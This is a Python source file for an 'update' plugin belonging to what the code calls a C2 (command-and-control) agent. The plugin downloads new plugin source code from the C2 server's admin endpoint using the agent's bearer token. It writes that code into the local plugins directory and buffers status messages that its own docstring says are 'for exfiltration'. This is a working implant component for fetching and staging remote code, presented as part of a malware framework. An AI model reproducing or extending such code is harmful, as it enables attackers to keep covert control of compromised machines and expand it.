import os
import requests
import datetime
from typing import List, Dict, Any

from .base_plugin import BasePlugin

class UpdatePlugin(BasePlugin):
    """
    A plugin to dynamically download and install new plugins from the C2 server.
    """

    def __init__(self):
        self._data_buffer: List[Dict[str, Any]] = []

    def get_name(self) -> str:
        return "update"

    def start(self, agent, args: Dict[str, Any]):
        """
        Downloads a new plugin from the C2 and saves it locally.
        Expects 'plugin_name' in args.
        """
        plugin_to_download = args.get("plugin_name")
        if not plugin_to_download:
            self._report_status("Error: No plugin name provided to update.")
            return

        print(f"Update plugin: Attempting to download '{plugin_to_download}'...")

        try:
            # Use the agent's configured C2 URL and auth headers
            c2_url = agent.C2_URL
            headers = {"Authorization": f"Bearer {agent.token}"}

            response = requests.get(f"{c2_url}/admin/plugins/{plugin_to_download}", headers=headers)
            response.raise_for_status()

            data = response.json()
            source_code = data.get("source_code")

            if not source_code:
                self._report_status(f"Error: C2 returned no source code for '{plugin_to_download}'.")
                return

            # Save the new plugin to the plugins directory
            plugin_dir = os.path.dirname(__file__)
            new_plugin_path = os.path.join(plugin_dir, f"{plugin_to_download}.py")

            with open(new_plugin_path, "w") as f:
                f.write(source_code)

            self._report_status(f"Successfully downloaded and saved plugin '{plugin_to_download}' to {new_plugin_path}.")

        except requests.exceptions.RequestException as e:
            self._report_status(f"Error downloading plugin '{plugin_to_download}': {e}")
        except Exception as e:
            self._report_status(f"An unexpected error occurred: {e}")

    def stop(self):
        pass

    def get_data(self) -> List[Dict[str, Any]]:
        data_to_send = list(self._data_buffer)
        self._data_buffer.clear()
        return data_to_send

    def _report_status(self, status: str):
        """Helper to format a status message for exfiltration."""
        print(status)
        data_entry = {
            "timestamp_utc": datetime.datetime.utcnow().isoformat(),
            "log_type": "update_status",
            "content": status
        }
        self._data_buffer.append(data_entry)
